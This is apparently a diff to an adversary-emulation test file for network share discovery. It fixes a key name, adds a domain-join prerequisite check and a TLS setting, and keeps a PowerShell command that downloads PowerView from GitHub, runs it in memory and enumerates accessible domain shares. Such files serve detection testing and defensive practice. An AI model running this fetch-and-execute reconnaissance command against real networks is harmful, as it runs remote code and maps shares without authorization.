@@ -45,7 +45,7 @@ atomic_tests:
     command: |
       smbstatus --shares
     name: bash
-    elevation_require: true
+    elevation_required: true
 - name: Network Share Discovery command prompt
   auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
   description: |
@@ -88,8 +88,17 @@ atomic_tests:
     Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.
   supported_platforms:
   - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Endpoint must be joined to domain
+    prereq_command: |
+      if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}
+    get_prereq_command: |
+      "Join system to domain"
   executor:
     command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
     name: powershell
 
